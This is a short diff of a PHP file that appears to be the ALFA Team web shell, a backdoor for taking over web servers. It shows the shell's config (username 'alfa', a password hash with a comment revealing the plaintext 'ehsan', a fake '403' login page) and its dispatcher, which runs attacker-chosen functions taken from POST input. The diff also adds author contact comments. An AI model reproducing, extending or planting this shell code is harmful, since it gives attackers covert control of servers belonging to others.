@@ -1,8 +1,14 @@
 <?php
-
+/*
+	Author: 	Solevisible/Alfa-Team
+	Telegram: 	https://telegram.me/solevisible
+	YouTube: 	https://youtube.com/solevisible
+	Gmail:		solevisible@gmail.com
+	Date:		Monday, September 14, 2020
+*/
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'd8ae95d68a715111d69902895cd874de',
+    'password' => 'd8ae95d68a715111d69902895cd874de',//md5(ehsan)
     'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
@@ -6554,5 +6560,9 @@ $_POST['a'] = 'FilesMan2';//'FilesMan';
 if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
 call_user_func('alfa' . $_POST['a']);
 exit;
-
+/*
+#Persian Gulf For Ever
+#skype : sole.sad
+#skype : ehsan.invisible
+*/
 ?>
